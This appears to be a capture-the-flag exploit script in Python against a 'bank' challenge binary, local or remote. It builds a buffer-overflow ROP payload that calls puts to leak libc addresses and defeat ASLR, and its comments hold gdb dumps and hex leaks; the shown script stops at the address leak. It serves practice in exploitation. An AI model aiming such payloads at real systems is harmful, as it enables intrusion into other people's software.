#!/usr/bin/python3
import struct
import sys
import subprocess
import socket
import re               # regex
import telnetlib

local = False

deadbeef = b'\xef\xbe\xad\xde'

# $eax needs to point to the string that will go into puts
# rop gadget: 0x080494e3 : mov eax, dword ptr [esp] ; ret
# Program received signal SIGSEGV, Segmentation fault.
# => 0xf7e711d1:	mov    ecx, DWORD PTR [eax]
eaxGadget = struct.pack("I", 0x080494e3)

# 0x08049050  puts@plt
putsPlt = struct.pack("I", 0x08049050)

# 0x08049060  exit@plt <======== EXIT address
# 0x08049070  __libc_start_main@plt <==== libc main address
# 0x08049208 <=== address after bank captcha
returnAddress = struct.pack("I", 0x08049060)

if local:
    payload = b'1 ' + b'A'*1012 + deadbeef + eaxGadget + putsPlt + returnAddress
    #                                        ^ at first ret go to the eaxGadget
    #                                                    ^ at eaxGadget, move in top of stack, which is the putsAddress. then ret to putsAddress :D
    #                                                      puts will print whatever $eax is pointing to, which is puts itself? but its not. It's the stack?                                                       
    #                                                              ^ from puts, ret to whatever :D
    # sys.stdout.buffer.write(payload)

    # subprocess
    # https://stackoverflow.com/questions/4760215/running-shell-command-and-capturing-the-output
    runBank = subprocess.run(['./bank'], stdout = subprocess.PIPE, input = payload)

    bankText = "Welcome to the Best Bank!\nCurrent balance: $500\n\nOptions:\n[1] Withdraw\n[2] Deposit\n[3] Check Balance\n[4] Exit\nEnter your choice:  _    _____    _____ _       _          _  __\n| |__|___ / __|_   _| |__   / \\   _ __ | |/ /\n| '_ \\ |_ \\/ __|| | | '_ \\ / _ \\ | '_ \\| ' /\n| |_) |__) \\__ \\| | | |_) / ___ \\| | | | . \\\n|_.__/____/|___/|_| |_.__/_/   \\_\\_| |_|_|\\_\\\n\nCaptcha: Incorrect!\n\n"
    bankHex = runBank.stdout[len(bankText):].hex()
    print(bankHex)    

    results = re.findall(".{6}f741", bankHex)    
    temp = re.findall("41.{6}f7", bankHex)
    results.extend(temp)    
    print(results)

    aslrBytes = {}
    for r in results:
        r = r.replace("41", "")
        address = [r[0:2], r[2:4], r[4:6], r[6:8]]
        address.reverse()
        address = "".join(address)
        middleBytes = address[2:5]
        print(middleBytes)
        if middleBytes in aslrBytes:
            aslrBytes[middleBytes] += 1
        else:
            aslrBytes[middleBytes] = 1
    print(aslrBytes)

    aslrKey = ""
    for key, value in aslrBytes.items():
        if value > 1:
            aslrKey = key            
            break
    print(f"ASLR key: {aslrKey}")    

else:
    payload = b'A'*1012 + deadbeef + eaxGadget + putsPlt + returnAddress + b'\n'

    # nc challenges.laptophackingcoffee.org 2168
    host = "challenges.laptophackingcoffee.org"
    port = 2168
    mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mySocket.connect((host, port))

    # Welcome to Best Bank
    response = mySocket.recv(1024)
    print(response)

    # Current balance: $500
    # ...
    # Enter your choice:
    response = mySocket.recv(1024)
    print(response)
    mySocket.send(b'1\n')

    # Captcha:
    response = mySocket.recv(1024)
    print(response)
    response = mySocket.recv(1024)
    print(response)
    # mySocket.send(b'b3sTbAnK\n') 
    mySocket.send(payload)

    # Captcha correct/incorrect
    response = mySocket.recv(1024)
    print(response)

    # Follow-on response
    response = mySocket.recv(1024)
    print(response.hex())
    # b'\n\x80\xcd\xed\xf7\x18\x00\x00\x00AAAAAAAAk\xe3\xd6\xf7AAAA\n'
    # Examine the first bit:
    # \x80\xcd\xed\xf7 =  80 cd ed f7 = f7edcd80
    
    # Check this in gdb
    # In gdb: 8����AAAAAAAAAAAAAAAAAAAAAAAA;���`���8��p������=> 0xf7e4a5ad <_IO_file_xsputn+381>:	sub    ebx,eax
    # >>> x/16wx $esp-20
    # 0xffffcff4:	0x00000038	0xf7fb0d80	0x00000038	0x00000038
    # 0xffffd004:	0xf7e4a5ad	0x41414141	0x41414141	0x41414141 <== 0xf7e4a5ad AAAA AAAA       AAAA
    # 0xffffd014:	0x41414141	0x41414141	0x41414141	0xf7e4a43b <==       AAAA AAAA AAAA 0xf7e4a43b
    # 0xffffd024:	0xf7fae860	0x00000038	0xf7fb0000	0xffffd070
    
    # These are very similar:
    # 0xf7edcd80      ; from remote server
    # 0xf7e4a5ad      ; from local testing in gdb
    #                 ; these must be the _IO_file_xsputn+381 instruction address with ASLR applied

    # From server: 
    # 0a38000000cd0ddcf74141414141414141414141414141414141414141414141415b0cdcf76028f2f7380000000040f2f7706fa9ff3064dbf70a
    #          ^------^                                                ^------^
    #          cf dd d0 0c                                             cf cd b0 15
   
    results = re.findall(".{6}f741", response.hex())    
    temp = re.findall("41.{6}f7", response.hex())
    results.extend(temp)    
    print(results)
    
    aslrBytes = {}
    for r in results:
        r = r.replace("41", "")
        address = [r[0:2], r[2:4], r[4:6], r[6:8]]
        address.reverse()
        address = "".join(address)
        middleBytes = address[2:5]
        print(middleBytes)
        if middleBytes in aslrBytes:
            aslrBytes[middleBytes] += 1
        else:
            aslrBytes[middleBytes] = 1
    print(aslrBytes)
    
    # Capture any response
    print("Final response:")
    response = mySocket.recv(1024)
    print(response)
    

# https://www.reddit.com/r/LiveOverflow/comments/eqxyzi/protostar_final_012_telnetlib_shellcode_difference/
# t = telnetlib.Telnet()
# t.sock = s
# t.interact()

# >>> info functions execve
# All functions matching regular expression "execve":
# Non-debugging symbols:
# 0xf7e975b0  execve


# >>> info breakpoints
# Num     Type           Disp Enb Address    What
# 1       breakpoint     keep y   0x08049276


